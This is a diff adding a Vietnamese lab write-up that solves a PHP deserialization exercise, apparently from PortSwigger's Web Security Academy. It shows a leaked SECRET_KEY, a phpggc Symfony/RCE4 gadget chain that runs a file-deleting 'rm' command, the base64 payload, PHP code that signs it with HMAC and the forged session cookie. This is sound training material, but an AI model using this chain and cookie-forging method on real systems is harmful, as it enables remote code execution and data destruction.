@@ -95,6 +95,36 @@ rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0
 Sau khi gửi request, bài lab được giải thành công.
 
 # 6. Exploiting PHP deserialization with a pre-built gadget chain
+Đăng nhập với credentials wiener:peter, nhận thấy session cookie là url encode của một object JSON, trong đó có 2 fields: "token" chứa base64 encode của một serialized object, và "sig_hmac_sha1" chứa một đoạn mã hóa SHA1. Để sinh ra một field "sig_hmac_sha1" hợp lệ thì chúng ta cần phải có được SECRET_KEY.
+
+Thử thay đổi cookie, lỗi được thông báo. Trong thông báo lỗi có đoạn string `Internal Server Error: Symfony Version: 4.3.6`, như vậy website sử dụng Symfony framework. Ta dự đoán rằng object trong field "token" sẽ được unserialized.
+
+Vào source code client, thấy dòng comment: `<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->`. Thử truy cập `/cgi-bin/phpinfo.php`, trang Debug được hiển thị. Từ đó, ta lấy được SECRET_KEY='6uuhafujuw27xgu6dfs8fddm3v08zd1o'. Ta sẽ cấu hình payload như sau:
+
+1) Sử dụng phpggc để sinh ra pre-build gadget chain cho PHP và thực hiện base64encode, làm giá trị cho field "token"
+2) Sử dụng hàm hash_hmac để mã hóa sha1 dựa trên SECRET_KEY đã thu được, làm giá trị cho field "sig_hmac_sha1"
+3) Thực hiện urlencode object `{"token":"<step 1>","sig_hmac_sha1":"<step 2>"}`
+
+Sử dụng phpggc, chạy lệnh `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0 ta được:
+
+```
+Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg
+```
+Sau đó, chạy lệnh `php -a` rồi chạy đoạn code sau:
+
+```
+$key = '6uuhafujuw27xgu6dfs8fddm3v08zd1o';
+$object = 'Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg';
+$cookie = urlencode('{"token":"'.$object.'","sig_hmac_sha1":"'.hash_hmac('sha1',$object,$key).'"}');
+echo $cookie;
+```
+Ta thu được:
+
+```
+%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22bdd3d6ee0b843c6f5f536e5184f1ff2538d48b7a%22%7D
+```
+
+Thay thế đoạn mã trên với session cookie hiện tại, sau khi refresh kết quả thành công.
 
 # 7. Exploiting Ruby deserialization using a documented gadget chain
 
